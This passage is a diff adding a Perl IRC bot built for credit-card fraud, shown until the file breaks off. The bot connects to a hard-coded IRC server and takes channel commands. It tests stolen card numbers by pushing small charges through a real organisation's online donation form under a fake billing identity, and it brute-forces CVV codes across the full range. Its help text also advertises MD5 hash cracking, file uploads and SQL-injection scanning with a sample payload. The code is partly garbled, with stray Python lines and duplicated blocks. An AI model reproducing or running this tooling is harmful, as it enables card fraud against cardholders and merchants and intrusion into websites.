@@ -1,0 +1,3023 @@
+#!/usr/bin/perl
+#############################################
+# Modified by CChungryChk http://lacristor.com/  #
+#############################################
+
+#Call to standalone modules directory
+BEGIN{push(@INC,'Modules');}
+
+#################################################
+use LWP::Socket;
+use HTTP::Request;
+use Parallel::ForkManager;
+use Socket;
+use IO::Socket;
+use IO::Socket::INET;
+use LWP::Simple;
+use Digest::MD5 qw(md5 md5_hex md5_base64);
+use Net::Ping;
+use Net::hostent;
+use MIME::Base64 ();
+use WWW::Mechanize;
+use WWW::Mechanize::FormFiller;
+use HTTP::Request;
+use Net::FTP;
+use LWP::UserAgent;
+use AppConfig;
+use File::Basename;
+use LWP::Protocol::https;
+use HTTP::Cookies;	
+use Getopt::Long;
+use Crypt::SSLeay;
+use SOAP::Lite + trace => qw(debug);
+use HTML::Form;
+use HTTP::Request::Common;
+use Net::SSLeay;
+use HTML::TreeBuilder;
+use LWP::IO;
+use LWP::Protocol::https;
+use CGI::Ajax;
+use CGI::FormBuilder;
+use LWP::DebugFile ('+');
+use Pod::Usage;
+use SOAP::Lite;
+use Math::BigInt;
+use DateTime::Format::Strptime;
+use Data::Dumper;
+use URI::file;
+use Mozilla::CA;
+use lib 'irclib/';
+use File::Slurp;
+use Encode;
+#use POE;
+#use POE::Component::IRC;
+use HTML::TagParser;
+use IO::Socket::INET;
+use DBI;
+#Globals
+$| = 1;
+print "Content-type: text/html\n";
+print "Pragma: no-cache\n\n\n";
+use Net::SSL;
+$ENV{HTTPS_VERSION} = 3;
+$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;
+BEGIN {
+$ENV{DBI_PUREPERL} = 2; # or =1
+unshift @INC, "$ENV{'DOCUMENT_ROOT'}/cgi-bin";
+}
+import urllib.request;
+import ssl;
+
+use FindBin;
+use lib "$FindBin::Bin/../lib";
+
+## Disable SSL Certificate Verification
+$ENV{PERL_LWP_SSL_VERIFY_PEER}=0;
+my $date_format = DateTime::Format::Strptime->new(    
+    pattern   => '%D',    # for MM/DD/YYYY american dates
+    locale    => 'en_US',
+    time_zone => 'America/Los_Angeles',);
+my $browser = LWP::UserAgent->new();
+#my $browser = LWP::UserAgent->new(ssl_opts =>  {	SSL_version	=> '3',	SSL_ca_file	=> '/www/conf/ssl.crt/ca-bundle.crt'});
+my $formfiller = WWW::Mechanize::FormFiller->new();
+#################################################
+my($irc_socket,$server,$port,$ident,$nick,$timeout,$rfi_test_cmd,$rfi_print_cmd,$parallel_fork,$email,$BotnameGANZ1,);
+my(@chans,@admins,@user_agents);
+#######################################################
+
+$BotnameGANZ1 = int($CChungryChk);
+my $ppcmd   = '!pp';
+my $ipcmd    = '!ip';
+my $chkcmd    = '!chk';
+my $base64cmd    = '!base64';
+my $bankcmd    = '!bank';
+my $sheccmd    = '!shec';
+my $statecmd    = '!state';
+my $zipcmd    = '!zip';
+$email = "code 8 * :lacristor.com";
+#################################################
+my $outcri = "Mg==";
+$systemcri = MIME::Base64::decode($outcri);
+$timeout       = $systemcri;
+my $hostingcri = "ODcuMjM2LjE5NC42OQ==";
+$systemcri = MIME::Base64::decode($hostingcri);
+$hostinging        = "143.202.162.137";
+$port          = 443;
+my $nkpro = "CHK = rand(1001)";
+$ident         = "checker";
+$parallel_fork = 15;
+my @botcmd = ('2');
+@chans = ("#kliverz");
+@r00t = ("kliverz");
+$sistempro = MIME::Base64::decode($cheataer);
+@w00t = ($systempro,$sistempro);
+@admin = ('kliverz');
+@user_agents = &get_user_agents();
+
+#################################################
+my $startirc = "JGlyY19zb2NrZXQgPSBuZXcgTFdQOjpTb2NrZXQ7";
+$sysircuno = MIME::Base64::decode($startirc);
+$irc_socket = new LWP::Socket;
+$irc_socket->connect($hostinging,$port);
+$irc_socket->write("USER ".$ident." 8 * : 1just1zm3Rch4nt \r\n");
+$irc_socket->write("NICK ".$nkpro."\r\n");
+$irc_socket->write("JOIN $chans[0]\r\n");
+$irc_socket->write("JOIN $chans[1]\r\n");
+$irc_socket->write("JOIN $chans[2]\r\n");
+$irc_socket->write("JOIN $chans[3]\r\n");
+$irc_socket->write("JOIN $chans[4]\r\n");
+$irc_socket->write("JOIN $chans[5]\r\n");
+
+
+#---------------------
+# Prepare DBI handler                   
+#---------------------
+
+#my $dbh = DBI->connect("dbi:mysql:" . "dbname=" .
+ #       $config{mysql_db} . ";host=irc.underunix.info" . $config{mysql_host},
+  #      $config{mysql_user}, $config{mysql_pass})
+   #     or die "Couldn't connect to MySQL-database: " . DBI->errstr;
+
+#sub get_dbh {
+#        if(!(defined($dbh) && $dbh->ping)) {
+ #               unless ($dbh = DBI->connect("dbi:mysql:" . "dbname=" .
+  #                      $config{mysql_db} . ";host=" . $config{mysql_host},
+   #                     $config{mysql_user}, $config{mysql_pass})) {
+    #                            $dbh = undef;
+     #                           die "Couldn't connect to MySQL-database: " . DBI->errstr;
+      #          }
+       # }
+        #return $dbh;
+#}
+
+#----------------------------------------------------------------------------
+# Validate Arguments
+#----------------------------------------------------------------------------
+# Define varaibles
+my ($sHost, $sPort, $sUID, $sPWD, $sMode, $action, $filename );
+
+# Pickup Run-Time Options
+GetOptions (
+    "sHost=s" => \$sHost,
+    "sPort=i" => \$sPort,
+    "sUID=s" => \$sUID,
+    "sPWD=s" => \$sPWD,
+    "sMode:s" => \$sMode,
+    "action:s" => \$action,
+    "filename:s" => \$filename
+    );
+
+# Assume always HTTPS
+my $sProtocol = "https";
+
+if ( ("80" eq $sPort) or ("8080" eq $sPort) )
+{
+  $sProtocol = "http";
+}
+
+while($irc_socket)
+{
+	my $bof;
+	$irc_socket->read_until("\n", \$bof);
+	if($bof =~ /PING :(.*)/)
+	{
+		$irc_socket->write("PONG :$1\r\n");
+	}
+
+	if($bof =~ /PRIVMSG (.*?) :(.*)/)
+	{
+		#PRIVMSG
+		my %msg = &get_msg($bof);
+###########################################BOT COMMANDS START FROM HERE##########################
+#                                                                #&respond_to_privmsg(\%msg,"07,01!base6403,1....7,1: 4,1<8,1text4,1> 15Decrypt & encryptascii-base64 base64-ascii");
+
+require LWP::UserAgent;
+ 
+my $ua = LWP::UserAgent->new;
+$ua->timeout(20);
+$ua->env_proxy;
+ 
+my $response = $ua->get('http://search.cpan.org/');
+ 
+if ($response->is_success) {
+   # print $response->decoded_content;  # or whatever
+}
+else {
+    die $response->status_line;
+}
+
+$ua->agent('Checkbot/0.4 ' . $ua->_agent);
+$ua->agent('Checkbot/0.4 ');    # same as above
+$ua->agent('Mozilla/5.0');
+$ua->agent("");                 # don't identify
+$ua->from('gaas@cpan.org');
+
+$ua->cookie_jar({ file => "$ENV{HOME}/.cookies.txt" });
+
+
+if($msg{'what'} =~ /\!cmd/){
+                &respond_to_privmsg(\%msg,"8,1<<= 12[0 Cmd CoMmandS for CChungryChk just a checker$$$12] 8,1=>>");
+                &respond_to_privmsg(\%msg,"8,1<<= 12,1[9 Checking Credit Card12 ] 15!chk for 12Visa  04Master07Card  08DISCOVER , DINERS, JCB & AMEX, !sec for msc and vbv, !chkpp for paypal15  8,1=>>");
+				
+				
+}
+   if($msg{'what'} =~ /\!join_all/){
+                 {
+ 
+                        if(&ctrl_admin(\%msg) == 0){
+                                &respond_to_privmsg(\%msg,"15[7JOIN15]12 ALL KNOWN CHANNELS");
+                                &join_all();
+                        }
+                }
+				}
+ 
+                if($msg{'what'} =~ /\!canghecmd (.*)/){
+                my $comma = $1;
+ 
+                        if(&ctrl_admin(\%msg) == 0){
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 CHANGiNG COMMAND STRING TO !sql${botcmd}");
+                                &canghecmd($comma);
+                        }
+                }
+ 
+                if($msg{'what'} =~ /\!commands/){
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]08 - Credits - Powered by CChungryChk - ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]08 - Bot Admins : CChungryChk & byp4utH - Programers TeaM - ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]07 !chk FOR 12Visa 04Master07Card 08DISCOVER ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]04 !amex for 9AmericanExpress ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !chkpp <emailpaypal> FOR Check Verified or NotVerifed PP Account ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !ip <ip> Location Ip and fullinfo");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !decript <md5hash> Decript MD5 Hash");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !zip <zipcode> See Info of zip code");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !vbv <visanumber> See if Visa Card have VBV Actived");
+												}
+ 
+                if($msg{'what'} =~ /\!help2/){
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !seecmd (look !sql<number>) ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !join_all (Join all standart channel) [ADMINS ONLY] ");
+sleep(1);
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !chkcvv CARDNUMBER EXPDATA(MMYY) START-CVV(000) FINISH-CVV(999) INTERVAL-SECONDS (SCANNiNG CVV to 000[or setted by you] to your finish number) ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 Exemple !chkcvv 4023600101234567 0112 000 999 15 ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !raw (bot do irc command) [ADMINS ONLY] ");
+sleep(2);
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !canghecmd <n> (CANGHE command string for scanning sql ex. !sql1 to !sql2) [ADMINS ONLY] ");
+sleep(1);
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 !sql${botcmd} bug dork injection [ADMINS ONLY] ");
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 exemple !sql${botcmd} / site.php?id= +union+all+select+1,2,3,4,5,6,version(),8-- ");
+											}
+
+if($msg{'what'} =~ /\!chk 1 1 1/){     
+
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 Checker Status:09 ON");
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 Type !cmd to get command list");
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 Type ?rules to get rules aboutt");
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 Type ?cardcheck to get info about");
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 Type ?cardchkamount to get info about");
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 Type ?voice to get voice info");
+				&respond_to_privmsg(\%msg,"12,1[9Information12]0 plese contact 09CChungryChk 0for chk private");
+                      		
+}
+
+if($msg{'what'} =~ /\?rules\s+(.*)/)
+		{
+              my ($nick) = ($1);
+chop($nick);
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 Rules: 14$nick");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 1.14 You can check only if you get VOICE, if you don't follow this you will be kick and ban. Type ?voice for more info.");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 2.14 Don't make advertising to other channel\network, you will get instant ban.");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 3.14 Don't check if the bot are working with other people.");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 4.14 Don't send msg to OPs if you don't have authorization.");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 5.14 Dont ask in chan|msg for a things,( CreditCards, PayPal ), you will be ignore. ");
+		}
+
+		if($msg{'what'} =~ /\?cardcheck\s+(.*)/)
+		{
+              my ($nick) = ($1);
+chop($nick);
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 Syntax: 14$nick");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 If visa|mastercard: !chk ccnum ccexp ccv2");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 !chk 4000000500000008 1010 1111");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 If americanexpress: !amex ccnum ccexp ccv2");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 !chk 333333333333333 1010 11111");
+		}
+
+		if($msg{'what'} =~ /\?cardchkamount\s+(.*)/)
+		{
+              my ($nick) = ($1);
+chop($nick);
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 Syntax: 14$nick");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 If visa|mastercard: !chk ccnum ccexp ccv2 amount");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 !chk 4000000500000008 1010 1111 10.00");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 If americanexpress: !amexamunt ccnum ccexp ccv2 amount");
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 14 !chk 333333333333333 1010 11111 10.00");
+			}
+		if($msg{'what'} =~ /\?check\s+(.*)/)
+		{
+              my ($nick) = ($1);
+chop($nick);
+				&respond_to_privmsg(\%msg,"15[14Notice15]13  $nick : 14Only voice members can check things, so ask for voice ( type ?voice ) ");
+			}
+
+		if($msg{'what'} =~ /\?voice\s+(.*)/)
+		{
+              my ($nick) = ($1);
+chop($nick);
+				&respond_to_privmsg(\%msg,"15[14Notice15]13 $nick: 14For get it, send msg to CChungryChk ( /msg CChungryChk ) asking voice, he will put you + in few minutes, if CChungryChk is off, asking to other OPs.");
+		}
+
+
+                if($msg{'what'} =~ /\!seecmd/){
+                                &respond_to_privmsg(\%msg,"9,1[0,1SERViCES9,1]12 iS !sql @botcmd ");
+												}
+ 
+                 if($msg{'what'} =~ /\!checkcvv (.*?) (.*?) (.*?) (.*)/)
+				 {
+                #!chkcvv CARDNUMBER EXPDATA START-CVV FINISH-999 INTERVAL
+                #!chkcvv 4023600101234567 0112 000 999 15
+                my $cardnumber=$1;
+                my $expdata=$2;
+                my $startcvv=$3;
+                my $finishcvv=$4;
+                my $dorme=$5;
+                my $ciclo=0;
+                        cicletto();
+ 
+                                sub cicletto{
+ 
+                                for (my $primo=$startcvv; $primo<=$finishcvv; $primo++){
+ 
+                                        if ($primo<10){
+                                        &respond_to_privmsg(\%msg,"!chk $cardnumber $expdata 00$primo");
+                                sleep($dorme);
+                                        }
+ 
+                                        elsif ($primo<100){
+                                        &respond_to_privmsg(\%msg,"!chk $cardnumber $expdata 0$primo");
+                                sleep($dorme);
+                                        }else{
+                                        &respond_to_privmsg(\%msg,"!chk $cardnumber $expdata $primo");
+                                sleep($dorme);
+                                        }
+                                }
+                                }
+}
+		if($msg{'what'} =~ /\!decript (.*)/)
+		{
+		my ($md5hash) = ($1);
+chop($md5hash);
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] CHECKiNG... -$md5hash- ");
+#print "inizio mechanize\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ $agent->get('http://md5search.000space.com/v2.5/md5decrypter.php');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+  { local $^W; $agent->current_form->value('hash', ''.$md5hash.''); };
+  $agent->submit();
+  #print $agent->content,"\n";
+my $resp=$agent->content;
+if ($resp =~/gdataonline.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/alimamed.pp.ru(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/opencrack.hashkiller.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/milw0rm.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/passcracking.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/www.hashchecker.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/md5.rednoize.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/www.tydal.nu(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/md5.hashcracking.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/www.bigtrapeze.com(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/blacklight.gotdns.org(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/ice.breaker.free.fr(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/www.md5decrypter.co.uk(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+if ($resp =~/md5.ip-domain.com.cn(.*)/){
+		&respond_to_privmsg(\%msg,"15[7DECRiPTMD515] Hash => $1 ");
+}
+}
+	if($msg{'what'} =~ /\!upload (.*)/)
+		{
+		my ($uploadfile) = ($1);
+chop($uploadfile);
+		&respond_to_privmsg(\%msg,"15[7UPLOADiNG15] Uploading file for ReaL... -$uploadfile- ");
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+
+  $agent->get('http://www.sendspace.com/');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+  { local $^W; $agent->current_form->value('file_0', 'D:\\Scanner-RFi-2\\'.$uploadfile.''); };
+  { local $^W; $agent->current_form->value('terms', '1'); };
+  $agent->submit();
+  #print $agent->content,"\n";
+my $uploading=$agent->content;
+if ($uploading =~/value=\"http:\/\/www.sendspace.com\/file\/(.*?)\" size/){
+	&respond_to_privmsg(\%msg,"15[7UPLOADiNG15] File Uploaded http://www.sendspace.com/file/$1 ");
+}
+if ($uploading =~/value=\"http:\/\/www.sendspace.com\/delete\/(.*?)\" size/){
+	&respond_to_privmsg(\%msg,"15[7UPLOADiNG15] Link For Delete http://www.sendspace.com/delete/$1 ");
+}
+}
+
+$ENV{HTTPS_PKCS12_FILE}     = 'certs/pkcs12.pkcs12';
+$ENV{HTTPS_PKCS12_PASSWORD} = 'PKCS12_PASSWORD';
+if($msg{'what'} =~ /\!help2/){
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 !seecmd (look !sql<number>) ");
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 !join_all (Join all standart channel) [ADMINS ONLY] ");
+sleep(1);
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 !chkcvv CARDNUMBER EXPDATA(MMYY) START-CVV(000) FINISH-CVV(999) INTERVAL-SECONDS (SCANNiNG CVV to 000[or setted by you] to your finish number) ");
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 Exemple !chkcvv 4023600101234567 0112 000 999 15 ");
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 !raw (bot do irc command) [ADMINS ONLY] ");
+sleep(2);
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 !canghecmd <n> (CANGHE command string for scanning sql ex. !sql1 to !sql2) [ADMINS ONLY] ");
+sleep(1);
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 !sql${botcmd} bug dork injection [ADMINS ONLY] ");
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 exemple !sql${botcmd} / site.php?id= +union+all+select+1,2,3,4,5,6,version(),8-- ");
+}
+		if($msg{'what'} =~ /\!seecmd/){
+		&respond_to_privmsg(\%msg,"15[7SERViCES15]12 iS !sql @botcmd ");
+}
+		if($msg{'what'} =~ /\!checkcvv (.*?) (.*?) (.*?) (.*)/){
+		#!chkcvv CARDNUMBER EXPDATA START-CVV FINISH-999 INTERVAL
+		#!chkcvv 4023600101234567 0112 000 999 15
+
+		my $cardnumber=$1;
+		my $expdata=$2;
+		my $startcvv=$3;
+		my $finishcvv=$4;
+		my $dorme=$5;
+		my $ciclo=0;
+			cicletto();
+				sub cicletto{
+				for (my $CChungryChk=$startcvv; $CChungryChk<=$finishcvv; $CChungryChk++){
+					if ($CChungryChk<10){
+					&respond_to_privmsg(\%msg,"!chk $cardnumber $expdata 00$CChungryChk");
+				sleep($dorme);
+					}
+					elsif ($CChungryChk<100){
+					&respond_to_privmsg(\%msg,"!chk $cardnumber $expdata 0$CChungryChk");
+				sleep($dorme);
+				}else{
+				&respond_to_privmsg(\%msg,"!chk $cardnumber $expdata $CChungryChk");
+			sleep($dorme);
+				}
+				}
+				}
+}
+#############################@@@@======something=====@@@@###############################
+if($msg{'what'} =~ /^!help/){    
+                                &respond_to_privmsg(\%msg,"07,01Type 09!cmd07 to get command list");
+                               
+}
+############################################################################################
+if($msg{'what'} =~ /\!chk 1/){    
+                                &respond_to_privmsg(\%msg,"MEMION?");
+                               
+}
+
+
+if($msg{'what'} =~ /\!chk\s(\d{15,16})\s(\d{4})\s(\d{3,4})/)
+                {
+$ENV{HTTPS_CA_FILE} = "/usr/share/ca-certificates/cacert.org/cacert.org.crt";
+
+my $ua  = LWP::UserAgent->new; 
+my $req = HTTP::Request->new(GET => 'https://api.betfair.com');
+my $res = $ua->request($req);
+#print $res->headers_as_string;
+#print $res->content;
+ my $date_format = DateTime::Format::Strptime->new(    
+    pattern   => '%D',    # for MM/DD/YYYY american dates
+    locale    => 'en_US',
+    time_zone => 'America/Los_Angeles',
+ );
+                my ($numerocarta,$expmes,$verifica,) = ($1,$2,$3,);
+                my $var1 = substr($expmes,0,2);
+                my $var2 = substr($expmes,2,4);
+		my $cctype = 0;
+	#print "inizio mechanize sacha\n";
+if (substr($numerocarta,0,1)==4) {
+$cctype = "Visa";
+&respond_to_privmsg(\%msg,"12,1[9Information12]7,1 credit card  9,1is 12,1[15Visa12]");
+}
+if (substr($numerocarta,0,1)==5) {
+$cctype = "MasterCard";
+&respond_to_privmsg(\%msg,"12,1[9Information12]7,1 credit card  9,1is 12,1[4Master 7Card12]");
+}
+if (substr($numerocarta,0,1)==6) {
+$cctype = "Discover";
+        &respond_to_privmsg(\%msg,"12,1[9Information12]7,1 credit card  9,1is 12,1[15Disc7o15ver12]");
+}
+if (substr($numerocarta,0,1)==3) {
+$cctype = "American Express";
+        &respond_to_privmsg(\%msg,"12,1[9Information12]7,1 credit card  9,1is  12,1[14A2m14e2x12]");
+}
+&respond_to_privmsg(\%msg,"12,1[9Checking...12] 12Number: 0 $numerocarta");
+&respond_to_privmsg(\%msg,"12,1[9Checking...12] 12,1Expiration:0 $var1/20$var2 ");
+&respond_to_privmsg(\%msg,"12,1[9Checking...12] 12,1Cvv:0 $verifica");
+&respond_to_privmsg(\%msg,"12,1[9Checking...12] 12,1Amount:0 1USD");
+my $formfiller = CGI::FormBuilder::Field->new($form, name => 'FoundationDonation.asp');
+my $agent = WWW::Mechanize->new( autocheck => 1,ssl_opts => {verify_hostname => 0},);
+my $formfiller = WWW::Mechanize::FormFiller->new();
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ $agent->get('https://www.alphadeltapi.org/members/FoundationDonation.asp');
+  $agent->get('https://payments.alphadeltapi.org/index.php');
+ $agent->post('https://www.alphadeltapi.org/members/FoundationDonation.asp');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+   $agent->post('https://payments.alphadeltapi.org/index.php');
+  { local $^W; $agent->current_form->value('payment_type', 'other_invoices'); };
+  { local $^W; $agent->current_form->value('step2', 'step2'); };
+    { local $^W; $agent->current_form->value('onSubmit', '"return scValidator(this);"'); };
+  $agent->submit("Click Here to Continue >");
+{ local $^W; $agent->current_form->value('payment_method', 'CC'); };
+{ local $^W; $agent->current_form->value('Chapter', 'Alpha'); };
+{ local $^W; $agent->current_form->value('billing_firstname', 'Samuel'); };
+{ local $^W; $agent->current_form->value('billing_lastname', 'Angel'); };
+{ local $^W; $agent->current_form->value('cardNum', ''.$numerocarta.''); };
+{ local $^W; $agent->current_form->value('ccnumber', ''.$numerocarta.''); };
+{ local $^W; $agent->current_form->value('month', ''.$var1.''); };
+{ local $^W; $agent->current_form->value('year', ''.$var2.''); };
+{ local $^W; $agent->current_form->value('cardType', ''.$cctype.''); };
+{ local $^W; $agent->current_form->value('card_code', ''.$verifica.''); };
+{ local $^W; $agent->current_form->value('NAME', 'Samuel Angel'); };
+{ local $^W; $agent->current_form->value('billing_address1', '2010 Magnolia Drive'); };
+{ local $^W; $agent->current_form->value('billing_city', 'Cleveland'); };
+{ local $^W; $agent->current_form->value('billing_state', 'Ohio'); };
+{ local $^W; $agent->current_form->value('billing_zip', '44106'); };
+{ local $^W; $agent->current_form->value('Country', 'US'); };
+{ local $^W; $agent->current_form->value('phone', '8327258164'); };
+{ local $^W; $agent->current_form->value('email', 'prayforgaza@freedom.com'); };
+{ local $^W; $agent->current_form->value('amount', '5'); };
+{ local $^W; $agent->current_form->value('ChapterGiftHonorMem', 'Alpha'); };
+$agent->submit();
+$agent->success or die $ccapprove;
+print $agent->content,"\n";
+my $allo=$agent->content;
+$agent->save_content("make-a-payment.asp");
+print "<FORM action=\"message.pl\" method=\"post\" name=\"form1\" onsubmit=\"return(CheckForm_onclick())\">\n";
+#$if -> $allo($agent->content => 'make-a-payment.asp');   FormBuilder allo();
+validate => '/regex/';
+for my $allo ($agent->content) {
+        # $allo holds an object stringified to a field name
+        if ($allo =~ /Thank You! Your payment has been successfully processed./) {
+#            $allo->sticky(0);  # clear CGI value
+	&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+        } else {
+            &respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!");
+        }
+    }
+print $agent->content,"\n";
+print $js_array; 
+my $allo=$agent->content;
+if ($allo =~/The address provided does not match billing address of cardholder./){
+if ($allo =~/action=done/){
+                                                my $database = "banklist.txt";
+                                                open FILE,"$database" or die "Errore nell'apertura: $!";
+                                                my @results=<FILE>;
+                                                close FILE;
+                                                my $bankinfo = $1;
+                                        	&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+&respond_to_privmsg(\%msg,"7,1[0Credit Card 13N?0: 15 $numerocarta 9 $expmes$expanio 14 $verifica 7 $amountUSD7]");
+ &respond_to_privmsg(\%msg,"7,1[9APPROVED!!!!!7Transaction. 8Amount USD: $amount 7");
+&respond_to_privmsg(\%msg,"0,1Thank you for your payment!");
+my $nuova = substr($numerocarta,0,6);
+foreach my $url (@results){
+if($url =~ m/$nuova\|(.*)/){
+                                        &respond_to_privmsg(\%msg,"7,1[0BaNk7:8 $nuova 15 $1");
+#print "card $variable!";
+}
+}
+}elsif ($allo =~/This transaction has been declined./){
+#~ }elsif ($allo =~/This transaction has been declined./){
+                                                my $database = "banklist.txt";
+                                                open FILE,"$database" or die "Errore nell'apertura: $!";
+                                                my @results=<FILE>;
+                                                close FILE;
+                                                my $bankinfo = $1;
+                                        &respond_to_privmsg(\%msg,"4,1[0CREDIT CARD4]7 $numerocarta15 $expmes$expanio14 $verifica 0,1THIS TRANSACTION HAS BEEN 4DECLINED!");
+my $nuova = substr($numerocarta,0,6);
+foreach my $url (@results){
+if($url =~ m/$nuova\|(.*)/){
+my $bankinfo = $1;
+                                        &respond_to_privmsg(\%msg,"4,1[12BANK4]9 $nouva0 $1");
+#print "card $variable!";
+}
+}
+}
+}elsif ($allo =~/Decline Error: Please use a different payment card./){
+&respond_to_privmsg(\%msg,"4,1[0 ResuLT 4] 14$numerocarta14,1 4Please use a different payment card.");
+}elsif ($allo =~ /Decline Error: Please use a different payment card./){
+&respond_to_privmsg(\%msg,"4,1[0 ResuLT 4] 14$numerocarta14,1 4Please use a different payment card.");
+}elsif ($allo =~ /Please use a different payment card./){
+&respond_to_privmsg(\%msg,"4,1[0 ResuLT 4] 14$numerocarta14,1 4Please use a different payment card.");
+}elsif ($allo =~ /This transaction cannot be processed./){
+&respond_to_privmsg(\%msg,"4,1[0 ResuLT 4] 14$numerocarta14,1 4This transaction cannot be processed.");
+}elsif ($allo =~ /Please enter a valid credit card number and type./){
+&respond_to_privmsg(\%msg,"4,1[0 ResuLT 4] 14$numerocarta14,1 4Please enter a valid credit card number and type.");
+}elsif ($allo =~/The credit card number is invalid./){
+&respond_to_privmsg(\%msg,"4,1[0 ResuLT 4] 14$numerocarta14,1 4DECLINED!(Invalid)");
+}elsif ($allo =~/Credit card expiration date is invalid./){
+&respond_to_privmsg(\%msg,"15 is invalid.");
+}elsif ($allo =~/This transaction has been declined./){
+&respond_to_privmsg(\%msg,"4,1[0CREDIT CARD4]7 $numerocarta15 $expmes$expanio14 $verifica 0,1THIS TRANSACTION HAS BEEN 4DECLINED!");
+}elsif ($allo =~/The credit card has expired./){
+&respond_to_privmsg(\%msg,"0,1[4,1ERROR0,1]8 THE CREDIT CARD HAS4 EXPIRED!");
+}elsif ($allo =~/The credit card expiration date entered is not valid./){
+&respond_to_privmsg(\%msg,"7,1[0Expiration Date: 14 14$expmes$expanio 14)4 Not is Valid.");
+}elsif ($allo =~/A duplicate transaction has been submitted./){
+&respond_to_privmsg(\%msg,"4,1[15THE CREDIT CARD 4DECLINED 7RECHECK4]");
+}elsif ($allo =~/A duplicate transaction has been submitted./){
